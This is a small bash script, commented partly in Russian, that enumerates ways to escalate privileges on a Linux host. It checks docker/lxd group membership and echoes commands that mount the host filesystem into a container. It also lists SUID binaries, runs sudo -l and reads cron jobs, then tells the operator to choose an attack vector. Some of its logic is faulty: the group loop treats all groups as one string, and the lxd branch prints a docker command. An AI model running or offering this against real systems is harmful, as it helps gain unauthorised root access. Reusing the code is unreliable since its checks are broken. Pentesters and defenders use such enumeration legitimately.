#!/bin/bash

# Быстрое раскрытие через группы и SUID/GUID
echo -e "\n🔍 Fast PrivEsc Enumeration:"

# Информация о пользователе и системе
echo -e "\n[+] User / Host info:"
whoami; hostname; uname -a

# Проверка на группы, в которых есть пользователь
groups | while read grp; do
  case $grp in
    lxd)
      echo -e "\n[LXD] possible privesc: launch privileged container"
      echo "docker run -v /:/mnt --rm -it alpine chroot /mnt sh";;
    docker)
      echo -e "\n[DOCKER] possible privesc: mount host fs"
      echo "docker run -v /:/mnt --rm -it ubuntu bash";;
  esac
done

# Проверка SUID бинарей
echo -e "\n[+] Checking SUID binaries:"
find / -perm -4000 -type f 2>/dev/null | head -n 30

# Проверка sudo без пароля
echo -e "\n[+] Checking sudo privileges:"
sudo -l 2>/dev/null

# Проверка cron заданий
echo -e "\n[+] Checking cron jobs:"
cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null

echo -e "\n✅ Done. Анализируй вывод и выбирай вектор."
